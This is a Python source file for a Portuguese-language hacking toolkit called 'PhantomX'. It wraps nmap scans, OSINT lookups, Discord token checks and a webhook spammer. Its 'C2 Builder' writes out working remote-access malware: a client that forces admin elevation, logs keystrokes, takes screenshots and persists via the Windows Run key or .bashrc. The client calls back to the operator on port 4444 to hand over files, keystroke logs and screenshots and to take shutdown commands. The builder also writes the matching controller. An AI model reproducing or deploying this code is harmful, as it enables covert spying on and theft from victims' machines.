#!/usr/bin/env python3
import os
import sys
import subprocess
import time
import requests
import json
import re
import webbrowser
import socket
import threading
import base64
from datetime import datetime
from pathlib import Path

# ==================== CORES ====================
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
WHITE = '\033[97m'
GREY = '\033[90m'
LGREY = '\033[37m'
DGREY = '\033[100m'
BOLD = '\033[1m'
RESET = '\033[0m'

# ==================== ASCII DO PHANTOMX (cinza) ====================
PHANTOMX_ASCII = f"""
{GREY}██▓███   ██░ ██  ▄▄▄       ███▄    █ ▄▄▄█████▓ ▒█████   ███▄ ▄███▓▒██   ██▒
{GREY}▓██░  ██▒▓██░ ██▒▒████▄     ██ ▀█   █ ▓  ██▒ ▓▒▒██▒  ██▒▓██▒▀█▀ ██▒▒▒ █ █ ▒░
{GREY}▓██░ ██▓▒▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒▒ ▓██░ ▒░▒██░  ██▒▓██    ▓██░░░  █   ░
{GREY}▒██▄█▓▒ ▒░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░ ▓██▓ ░ ▒██   ██░▒██    ▒██  ░ █ █ ▒ 
{GREY}▒██▒ ░  ░░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░  ▒██▒ ░ ░ ████▓▒░▒██▒   ░██▒▒██▒ ▒██▒
{GREY}▒▓▒░ ░  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒   ▒ ░░   ░ ▒░▒░▒░ ░ ▒░   ░  ░▒▒ ░ ░▓ ░
{GREY}░▒ ░      ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░    ░      ░ ▒ ▒░ ░  ░      ░░░   ░▒ ░
{GREY}░░        ░  ░░ ░  ░   ▒      ░   ░ ░   ░      ░ ░ ░ ▒  ░      ░    ░    ░  
{GREY}          ░  ░  ░      ░  ░         ░              ░ ░         ░    ░    ░
{RESET}
"""

# ==================== BORDA COM GRADIENTE ====================
def print_gradient_border(title=""):
    grad = f"{DGREY}══════════{GREY}══════════{LGREY}══════════{WHITE}══════════{RESET}"
    border = f"{GREY}┌{grad}{GREY}┐{RESET}"
    print(border)
    if title:
        print(f"{GREY}│{RESET} {BOLD}{WHITE}{title:^50}{RESET} {GREY}│{RESET}")
        print(f"{GREY}│{grad}{GREY}│{RESET}")
    else:
        print(f"{GREY}│{grad}{GREY}│{RESET}")

def print_gradient_border_bottom():
    grad = f"{DGREY}══════════{GREY}══════════{LGREY}══════════{WHITE}══════════{RESET}"
    print(f"{GREY}└{grad}{GREY}┘{RESET}")

# ==================== UTILITÁRIOS ====================
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    print(PHANTOMX_ASCII)
    print(f"{LGREY}github.com/phantomx/PhantomX-Tools{RESET}\n")

def install_module(module):
    try:
        __import__(module)
        return True
    except ImportError:
        print(f"{YELLOW}[!] Instalando {module}...{RESET}")
        subprocess.run([sys.executable, "-m", "pip", "install", module, "-q"], capture_output=True)
        return False

# ==================== PENTESTING ====================
def advanced_scanner():
    target = input(f"{CYAN}[?]{RESET} Target IP/Domain: ")
    if target:
        print(f"{YELLOW}[*] Executando scan avançado...{RESET}")
        subprocess.run(['nmap', '-A', '-T4', target])
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def vulnerability_scanner():
    target = input(f"{CYAN}[?]{RESET} Target IP/Domain: ")
    if target:
        print(f"{YELLOW}[*] Escaneando vulnerabilidades...{RESET}")
        subprocess.run(['nmap', '--script', 'vuln', target])
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def port_scanner():
    target = input(f"{CYAN}[?]{RESET} Target IP: ")
    if target:
        print(f"{YELLOW}[*] Escaneando portas...{RESET}")
        subprocess.run(['nmap', '-p-', target])
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def url_crawler():
    target = input(f"{CYAN}[?]{RESET} URL: ")
    if target:
        try:
            r = requests.get(target, timeout=10)
            print(f"{GREEN}Status: {r.status_code}{RESET}")
            print(f"{GREEN}Tamanho: {len(r.content)} bytes{RESET}")
        except Exception as e:
            print(f"{RED}Erro: {e}{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def ip_pinger():
    target = input(f"{CYAN}[?]{RESET} IP: ")
    if target:
        param = '-n' if os.name == 'nt' else '-c'
        os.system(f"ping {param} 4 {target}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def host_discovery():
    target = input(f"{CYAN}[?]{RESET} Network (ex: 192.168.1.0/24): ")
    if target:
        print(f"{YELLOW}[*] Descobrindo hosts...{RESET}")
        subprocess.run(['nmap', '-sn', target])
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

# ==================== OSINT ====================
def dorking():
    dork = input(f"{CYAN}[?]{RESET} Google Dork: ")
    if dork:
        webbrowser.open(f"https://www.google.com/search?q={dork.replace(' ', '+')}")
        print(f"{GREEN}[+] Abrindo no navegador...{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def wallet_tracker():
    wallet = input(f"{CYAN}[?]{RESET} Bitcoin Wallet: ")
    if wallet:
        webbrowser.open(f"https://www.blockchain.com/btc/address/{wallet}")
        print(f"{GREEN}[+] Abrindo blockchain explorer...{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def username_tracker():
    username = input(f"{CYAN}[?]{RESET} Username: ")
    if username:
        sites = {
            'GitHub': f'https://github.com/{username}',
            'Twitter': f'https://twitter.com/{username}',
            'Instagram': f'https://instagram.com/{username}',
            'Reddit': f'https://reddit.com/user/{username}'
        }
        print(f"{YELLOW}[*] Buscando {username}...{RESET}")
        for site, url in sites.items():
            try:
                r = requests.get(url, timeout=5)
                if r.status_code == 200:
                    print(f"{GREEN}[+] Encontrado em {site}: {url}{RESET}")
                else:
                    print(f"{RED}[-] Não encontrado em {site}{RESET}")
            except:
                print(f"{RED}[-] Erro ao verificar {site}{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def email_tracker():
    email = input(f"{CYAN}[?]{RESET} Email: ")
    if email:
        if re.match(r"[^@]+@[^@]+\.[^@]+", email):
            print(f"{GREEN}[+] Email válido! Domínio: {email.split('@')[1]}{RESET}")
        else:
            print(f"{RED}[-] Email inválido{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def email_lookup():
    email = input(f"{CYAN}[?]{RESET} Email: ")
    if email:
        try:
            r = requests.get(f"https://api.hunter.io/v2/email-verifier?email={email}&api_key=demo")
            data = r.json()
            if 'data' in data:
                print(f"{GREEN}Status: {data['data']['status']}{RESET}")
        except:
            print(f"{YELLOW}[!] Use API key real para resultados precisos{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def ip_lookup():
    ip = input(f"{CYAN}[?]{RESET} IP: ")
    if ip:
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}").json()
            if r['status'] == 'success':
                print(f"{GREEN}País: {r['country']}{RESET}")
                print(f"{GREEN}Cidade: {r['city']}{RESET}")
                print(f"{GREEN}ISP: {r['isp']}{RESET}")
            else:
                print(f"{RED}IP não encontrado{RESET}")
        except:
            print(f"{RED}Erro ao consultar IP{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def phone_lookup():
    number = input(f"{CYAN}[?]{RESET} Telefone (+5511999999999): ")
    if number:
        print(f"{YELLOW}[!] Para consulta real, use: https://numverify.com{RESET}")
        print(f"{GREY}Número informado: {number}{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def instagram_lookup():
    username = input(f"{CYAN}[?]{RESET} Instagram Username: ")
    if username:
        webbrowser.open(f"https://www.instagram.com/{username}/")
        print(f"{GREEN}[+] Abrindo perfil...{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

# ==================== UTILITIES ====================
def file_metadata():
    filepath = input(f"{CYAN}[?]{RESET} Arquivo: ")
    if filepath and os.path.exists(filepath):
        stat = os.stat(filepath)
        print(f"{GREEN}Tamanho: {stat.st_size} bytes{RESET}")
        print(f"{GREEN}Criado: {datetime.fromtimestamp(stat.st_ctime)}{RESET}")
        print(f"{GREEN}Modificado: {datetime.fromtimestamp(stat.st_mtime)}{RESET}")
    else:
        print(f"{RED}Arquivo não encontrado{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def file_metadata_deleter():
    filepath = input(f"{CYAN}[?]{RESET} Arquivo: ")
    if filepath and os.path.exists(filepath):
        confirm = input(f"{RED}Remover metadados? (y/n): {RESET}")
        if confirm.lower() == 'y':
            try:
                if os.name == 'nt':
                    subprocess.run(['powershell', '-Command', f"(Get-Item '{filepath}').LastWriteTime = Get-Date"])
                else:
                    os.system(f"touch {filepath}")
                print(f"{GREEN}[+] Metadados limpos!{RESET}")
            except:
                print(f"{RED}Erro ao limpar metadados{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def website_cloner():
    url = input(f"{CYAN}[?]{RESET} URL para clonar: ")
    if url:
        try:
            r = requests.get(url, timeout=10)
            desktop = os.path.join(os.path.expanduser("~"), "Desktop")
            filename = "cloned_website.html"
            filepath = os.path.join(desktop, filename)
            with open(filepath, 'w', encoding='utf-8') as f:
                f.write(r.text)
            print(f"{GREEN}[+] Site clonado! Salvo em: {filepath}{RESET}")
            abrir = input(f"{YELLOW}Abrir no navegador? (s/n): {RESET}")
            if abrir.lower() == 's':
                webbrowser.open(filepath)
        except Exception as e:
            print(f"{RED}Erro: {e}{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

# ==================== DISCORD TOOLS ====================
def discord_token_info():
    token = input(f"{CYAN}[?]{RESET} Discord Token: ")
    if not token:
        return
    try:
        headers = {'Authorization': token}
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if r.status_code == 200:
            data = r.json()
            print(f"{GREEN}[+] ID: {data['id']}{RESET}")
            print(f"{GREEN}[+] Username: {data['username']}#{data['discriminator']}{RESET}")
            print(f"{GREEN}[+] Email: {data.get('email', 'N/A')}{RESET}")
            print(f"{GREEN}[+] Verificado: {data.get('verified', False)}{RESET}")
            print(f"{GREEN}[+] 2FA: {data.get('mfa_enabled', False)}{RESET}")
        else:
            print(f"{RED}[-] Token inválido ou expirado{RESET}")
    except Exception as e:
        print(f"{RED}Erro: {e}{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def discord_token_login():
    token = input(f"{CYAN}[?]{RESET} Discord Token: ")
    if not token:
        return
    try:
        headers = {'Authorization': token}
        r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        if r.status_code == 200:
            data = r.json()
            print(f"{GREEN}[+] Logado como {data['username']}#{data['discriminator']}{RESET}")
            print(f"{GREEN}[+] Token válido!{RESET}")
        else:
            print(f"{RED}[-] Token inválido{RESET}")
    except:
        print(f"{RED}[-] Falha na conexão{RESET}")
    input(f"{GREY}Pressione Enter para voltar...{RESET}")

def discord_token_nuker():
    print(f"{YELLOW}[!] Token Nuker - Requer implementação completa (risco de ban){RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def discord_token_mass_dm():
    print(f"{YELLOW}[!] Token Mass DM - Requer implementação completa{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def discord_nitro_generator():
    print(f"{YELLOW}[!] Nitro Generator - 99.9% falso, não recomendado{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def discord_token_joiner():
    print(f"{YELLOW}[!] Token Joiner - Requer invite link{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def discord_token_leaver():
    print(f"{YELLOW}[!] Token Leaver - Requer guild ID{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def discord_token_spammer():
    print(f"{YELLOW}[!] Token Spammer - Requer channel ID e mensagem{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def discord_webhook_info():
    webhook = input(f"{CYAN}[?]{RESET} Webhook URL: ")
    if webhook:
        try:
            r = requests.get(webhook)
            if r.status_code == 200:
                data = r.json()
                print(f"{GREEN}Nome: {data.get('name')}{RESET}")
                print(f"{GREEN}Canal: {data.get('channel_id')}{RESET}")
                print(f"{GREEN}Guild: {data.get('guild_id')}{RESET}")
            else:
                print(f"{RED}Webhook inválido{RESET}")
        except:
            print(f"{RED}Erro{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def discord_webhook_delete():
    webhook = input(f"{CYAN}[?]{RESET} Webhook URL: ")
    if webhook:
        try:
            r = requests.delete(webhook)
            if r.status_code == 204:
                print(f"{GREEN}Webhook deletado{RESET}")
            else:
                print(f"{RED}Falha{RESET}")
        except:
            print(f"{RED}Erro{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def discord_webhook_spammer():
    webhook = input(f"{CYAN}[?]{RESET} Webhook URL: ")
    msg = input(f"{CYAN}[?]{RESET} Mensagem: ")
    count = input(f"{CYAN}[?]{RESET} Quantidade: ")
    if webhook and msg and count.isdigit():
        for _ in range(int(count)):
            requests.post(webhook, json={'content': msg})
            time.sleep(0.5)
        print(f"{GREEN}Enviado{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def discord_webhook_generator():
    print(f"{YELLOW}[!] Webhook Generator - Crie no servidor manualmente{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def discord_token_generator():
    print(f"{YELLOW}[!] Token Generator - Não funcional (tokens são únicos){RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def discord_bot_server_nuker():
    print(f"{YELLOW}[!] Bot Server Nuker - Requer token de bot{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def discord_server_info():
    invite = input(f"{CYAN}[?]{RESET} Invite code: ")
    if invite:
        try:
            r = requests.get(f"https://discord.com/api/v9/invites/{invite}")
            if r.status_code == 200:
                data = r.json()
                print(f"{GREEN}Servidor: {data['guild']['name']}{RESET}")
                print(f"{GREEN}Membros: {data['approximate_member_count']}{RESET}")
            else:
                print(f"{RED}Inválido{RESET}")
        except:
            print(f"{RED}Erro{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

# ==================== ROBLOX TOOLS ====================
def roblox_cookie_login():
    print(f"{YELLOW}[!] Roblox Cookie Login - Em desenvolvimento{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def roblox_cookie_info():
    print(f"{YELLOW}[!] Roblox Cookie Info - Em desenvolvimento{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def roblox_id_info():
    print(f"{YELLOW}[!] Roblox ID Info - Em desenvolvimento{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def roblox_user_info():
    print(f"{YELLOW}[!] Roblox User Info - Em desenvolvimento{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

# ==================== VIRUS BUILDER ====================
def virus_builder():
    print(f"{YELLOW}[!] Virus Builder - Requer implementação complexa{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def obfuscator():
    print(f"{YELLOW}[!] Obfuscator - Use pyarmor ou similar{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

def rat_discord():
    print(f"{YELLOW}[!] RAT Discord - Use o C2 Builder do menu 7{RESET}")
    input(f"{GREY}Pressione Enter...{RESET}")

# ==================== C2 & PERSISTENCE ====================
def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

def build_c2():
    print(f"{CYAN}=== Builder C2 PhantomX ==={RESET}")
    ip = get_local_ip()
    print(f"{GREEN}IP detectado: {ip}{RESET}")
    cliente_nome = input("Nome do cliente (ex: alvo): ").strip()
    if not cliente_nome.endswith('.py'):
        cliente_nome += '.py'
    controlador_nome = input("Nome do controlador (ex: c2): ").strip()
    if not controlador_nome.endswith('.py'):
        controlador_nome += '.py'
    porta = 4444
    downloads = os.path.expanduser("~/Downloads")
    os.makedirs(downloads, exist_ok=True)

    cliente_code = f'''#!/usr/bin/env python3
import os, sys, time, socket, subprocess, threading, base64, requests
from datetime import datetime

if os.name == 'nt':
    import ctypes
    if ctypes.windll.shell32.IsUserAnAdmin() == 0:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit(0)

HOST = "{ip}"
PORT = {porta}

def install_module(module):
    try:
        __import__(module)
        return True
    except ImportError:
        subprocess.run([sys.executable, "-m", "pip", "install", module, "-q"], capture_output=True)
        return False

install_module('pynput')
install_module('Pillow')

from pynput import keyboard
from PIL import ImageGrab

log_file = os.path.expandvars("%temp%\\\\keylog.txt") if os.name == 'nt' else "/tmp/keylog.txt"
def on_press(key):
    try:
        with open(log_file, "a") as f:
            if hasattr(key, 'char') and key.char:
                f.write(key.char)
            else:
                f.write(f"[{{key}}]")
    except: pass
keylogger_thread = threading.Thread(target=lambda: keyboard.Listener(on_press=on_press).start(), daemon=True)
keylogger_thread.start()

def screenshot():
    try:
        img = ImageGrab.grab()
        temp_file = os.path.expandvars("%temp%\\\\screenshot.png") if os.name == 'nt' else "/tmp/screenshot.png"
        img.save(temp_file)
        with open(temp_file, "rb") as f:
            return base64.b64encode(f.read()).decode()
    except Exception as e:
        return f"ERRO: {{e}}"

def add_persistence():
    if os.name == 'nt':
        import winreg
        key = winreg.HKEY_CURRENT_USER
        subkey = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
        try:
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "PhantomXClient", 0, winreg.REG_SZ, sys.executable + " " + " ".join(sys.argv))
        except:
            pass
    else:
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write(f"\\npython3 {os.path.abspath(sys.argv[0])} &\\n")
add_persistence()

def list_files():
    return "\\n".join(os.listdir("."))

def main():
    while True:
        try:
            s = socket.socket()
            s.connect((HOST, PORT))
            while True:
                cmd = s.recv(1024).decode().strip()
                if not cmd: break
                if cmd == "arquivos":
                    s.send(list_files().encode())
                elif cmd == "screenshot":
                    img = screenshot()
                    s.send(img.encode())
                elif cmd == "logs":
                    if os.path.exists(log_file):
                        with open(log_file, "r") as f:
                            s.send(f.read().encode())
                    else:
                        s.send(b"Sem logs")
                elif cmd == "desligar":
                    os.system("shutdown /s /t 0" if os.name == 'nt' else "shutdown -h now")
                    break
                elif cmd == "reiniciar":
                    os.system("shutdown /r /t 0" if os.name == 'nt' else "shutdown -r now")
                    break
                elif cmd == "sair":
                    s.close()
                    break
                else:
                    s.send(b"Comando desconhecido")
        except:
            time.sleep(10)

if __name__ == "__main__":
    main()
'''
    with open(os.path.join(downloads, cliente_nome), 'w') as f:
        f.write(cliente_code)

    controlador_code = f'''#!/usr/bin/env python3
import socket, base64, os

HOST = "0.0.0.0"
PORT = {porta}

def menu():
    print("\\n" + "="*50)
    print("     PhantomX C2 Controlador")
    print("="*50)
    print("1. Listar arquivos")
    print("2. Screenshot")
    print("3. Keylogger logs")
    print("4. Desligar PC")
    print("5. Reiniciar PC")
    print("6. Sair")
    print("="*50)

def main():
    server = socket.socket()
    server.bind((HOST, PORT))
    server.listen(1)
    print(f"[*] Aguardando cliente em {{HOST}}:{{PORT}}")
    conn, addr = server.accept()
    print(f"[+] Cliente conectado: {{addr}}")
    while True:
        menu()
        op = input("C2> ")
        if op == "1":
            conn.send(b"arquivos")
            resp = conn.recv(65535).decode()
            print(resp)
        elif op == "2":
            conn.send(b"screenshot")
            img_b64 = conn.recv(9999999).decode()
            if img_b64.startswith("ERRO"):
                print(f"[!] {{img_b64}}")
            else:
                with open("screenshot.png", "wb") as f:
                    f.write(base64.b64decode(img_b64))
                print("[+] Screenshot salvo como screenshot.png")
                os.system("start screenshot.png" if os.name == 'nt' else "xdg-open screenshot.png")
        elif op == "3":
            conn.send(b"logs")
            logs = conn.recv(65535).decode()
            print("[LOGS]")
            print(logs)
        elif op == "4":
            conn.send(b"desligar")
            print(conn.recv(1024).decode())
            break
        elif op == "5":
            conn.send(b"reiniciar")
            print(conn.recv(1024).decode())
            break
        elif op == "6":
            conn.send(b"sair")
            break
        input("Enter...")

if __name__ == "__main__":
    main()
'''
    with open(os.path.join(downloads, controlador_nome), 'w') as f:
        f.write(controlador_code)

    print(f"\n{GREEN}[+] Arquivos criados em Downloads:{RESET}")
    print(f"   Cliente: {cliente_nome}")
    print(f"   Controlador: {controlador_nome}")
    print(f"\n{YELLOW}Instruções:{RESET}")
    print("1. Execute o controlador: python " + controlador_nome)
    print("2. Execute o cliente na máquina alvo (como admin)")
    print("3. Use o menu para enviar comandos")
    input("Pressione Enter para voltar...")

def add_persistence_manual():
    if os.name == 'nt':
        try:
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "PhantomX", 0, winreg.REG_SZ, sys.executable)
            print(f"{GREEN}[+] Persistência adicionada ao startup{RESET}")
        except Exception as e:
            print(f"{RED}Erro: {e}{RESET}")
    else:
        with open(os.path.expanduser("~/.bashrc"), "a") as f:
            f.write(f"\npython3 {os.path.abspath(sys.argv[0])} &\n")
        print(f"{GREEN}[+] Persistência adicionada ao .bashrc{RESET}")
    input("Pressione Enter...")

def keylogger_start():
    print(f"{YELLOW}[!] Para keylogger, use o C2 Builder (opção 7) e execute o cliente na vítima{RESET}")
    input("Pressione Enter...")

def screenshot_capture():
    print(f"{YELLOW}[!] Para screenshot remoto, use o C2 Builder (opção 7){RESET}")
    input("Pressione Enter...")

# ==================== PAGINAÇÃO ====================
def paginate(items, title, per_page=6):
    total = len(items)
    if total == 0:
        print(f"{YELLOW}Nenhuma ferramenta disponível.{RESET}")
        input("Pressione Enter...")
        return
    page = 0
    max_page = (total - 1) // per_page
    while True:
        clear()
        print_banner()
        print_gradient_border(title)
        start = page * per_page
        end = min(start + per_page, total)
        for idx, (name, func) in enumerate(items[start:end], start=1):
            print(f"{GREY}{start+idx:>2}{RESET} {WHITE}{name}{RESET}")
        print_gradient_border_bottom()
        print(f"\n{LGREY}Página {page+1}/{max_page+1} | {WHITE}N{RESET} próxima | {WHITE}P{RESET} anterior | {WHITE}N°{RESET} executar | {WHITE}V{RESET} voltar{RESET}")
        opt = input(f"{CYAN}[?]{RESET} ").strip().lower()
        if opt == 'n' and page < max_page:
            page += 1
        elif opt == 'p' and page > 0:
            page -= 1
        elif opt == 'v':
            break
        elif opt.isdigit():
            num = int(opt)
            if 1 <= num <= len(items):
                func = items[start + num - 1][1]
                clear()
                print_banner()
                func()
            else:
                print(f"{RED}Número inválido{RESET}")
                time.sleep(0.8)
        else:
            print(f"{RED}Opção inválida{RESET}")
            time.sleep(0.8)

# ==================== MENUS PRINCIPAIS ====================
def menu_pentesting():
    items = [
        ("Advanced Scanner", advanced_scanner),
        ("Vulnerability Scanner", vulnerability_scanner),
        ("Port Scanner", port_scanner),
        ("URL Discovery Crawler", url_crawler),
        ("IP Pinger", ip_pinger),
        ("Host Discovery", host_discovery)
    ]
    paginate(items, "PENTESTING TOOLS")

def menu_osint():
    items = [
        ("Dorking Query Engine", dorking),
        ("Wallet Tracker", wallet_tracker),
        ("Username Tracker", username_tracker),
        ("Email Tracker", email_tracker),
        ("Email Lookup", email_lookup),
        ("IP Lookup", ip_lookup),
        ("Phone Number Lookup", phone_lookup),
        ("Instagram Profile Lookup", instagram_lookup)
    ]
    paginate(items, "OSINT TOOLS")

def menu_utilities():
    items = [
        ("File Metadata Scanner", file_metadata),
        ("File Metadata Deleter", file_metadata_deleter),
        ("Website Cloner", website_cloner)
    ]
    paginate(items, "UTILITIES TOOLS")

def menu_discord():
    items = [
        ("Token Nuker", discord_token_nuker),
        ("Token Mass DM", discord_token_mass_dm),
        ("Nitro Generator", discord_nitro_generator),
        ("Token Info", discord_token_info),
        ("Token Login", discord_token_login),
        ("Token Joiner", discord_token_joiner),
        ("Token Leaver", discord_token_leaver),
        ("Token Spammer", discord_token_spammer),
        ("Webhook Info", discord_webhook_info),
        ("Webhook Delete", discord_webhook_delete),
        ("Webhook Spammer", discord_webhook_spammer),
        ("Webhook Generator", discord_webhook_generator),
        ("Token Generator", discord_token_generator),
        ("Bot Server Nuker", discord_bot_server_nuker),
        ("Server Info", discord_server_info)
    ]
    paginate(items, "DISCORD TOOLS")

def menu_roblox():
    items = [
        ("Cookie Login", roblox_cookie_login),
        ("Cookie Info", roblox_cookie_info),
        ("ID Info", roblox_id_info),
        ("User Info", roblox_user_info)
    ]
    paginate(items, "ROBLOX TOOLS")

def menu_virus():
    items = [
        ("Virus Builder", virus_builder),
        ("Obfuscator", obfuscator),
        ("RAT Discord", rat_discord)
    ]
    paginate(items, "VIRUS BUILDER")

def menu_c2():
    items = [
        ("Builder C2 (cliente/servidor)", build_c2),
        ("Adicionar persistência (manual)", add_persistence_manual),
        ("Keylogger (remoto via C2)", keylogger_start),
        ("Screenshot remoto (via C2)", screenshot_capture)
    ]
    paginate(items, "C2 & PERSISTENCE")

def menu_principal():
    while True:
        clear()
        print_banner()
        print_gradient_border("PHANTOMX GREY EDITION")
        print(f"{WHITE} 1{RESET} {GREY}Pentesting{RESET}")
        print(f"{WHITE} 2{RESET} {GREY}OSINT{RESET}")
        print(f"{WHITE} 3{RESET} {GREY}Utilities{RESET}")
        print(f"{WHITE} 4{RESET} {GREY}Discord Tools{RESET}")
        print(f"{WHITE} 5{RESET} {GREY}Roblox Tools{RESET}")
        print(f"{WHITE} 6{RESET} {GREY}Virus Builder{RESET}")
        print(f"{WHITE} 7{RESET} {GREY}C2 & Persistence{RESET}")
        print(f"{WHITE} 0{RESET} {GREY}Sair{RESET}")
        print_gradient_border_bottom()
        opt = input(f"{CYAN}[?]{RESET} Escolha: ").strip()
        if opt == '1':
            menu_pentesting()
        elif opt == '2':
            menu_osint()
        elif opt == '3':
            menu_utilities()
        elif opt == '4':
            menu_discord()
        elif opt == '5':
            menu_roblox()
        elif opt == '6':
            menu_virus()
        elif opt == '7':
            menu_c2()
        elif opt == '0':
            print(f"{GREEN}Saindo...{RESET}")
            sys.exit(0)
        else:
            print(f"{RED}Opção inválida{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    try:
        menu_principal()
    except KeyboardInterrupt:
        print(f"\n{RED}Interrompido pelo usuário{RESET}")
        sys.exit(0)
